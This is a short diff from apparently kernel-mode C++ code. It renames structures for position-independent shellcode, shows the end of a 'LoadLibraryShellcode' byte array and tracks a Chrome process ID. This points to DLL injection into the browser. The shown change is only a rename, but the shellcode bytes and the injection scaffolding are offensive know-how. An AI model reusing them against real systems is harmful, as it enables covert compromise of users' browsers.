@@ -65,14 +65,14 @@ constexpr UCHAR LoadLibraryShellcode[282] = {
 	0x64, 0x65, 0x72, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x5C, 0xC3
 };
 
-struct PisParameters
+struct KernelPisParameters
 {
 	LPVOID MmGetSystemRoutineAddress;
 	LPVOID ReturnedDataAddress;
 	USHORT ReturnedDataMaxSize;
 };
 
-typedef void (__stdcall * PicFunction)(PVOID StartContext);
+typedef void (__stdcall * KernelPisFunction)(PVOID StartContext);
 
 struct Globals {
 	ULONG ChromePID = 0;
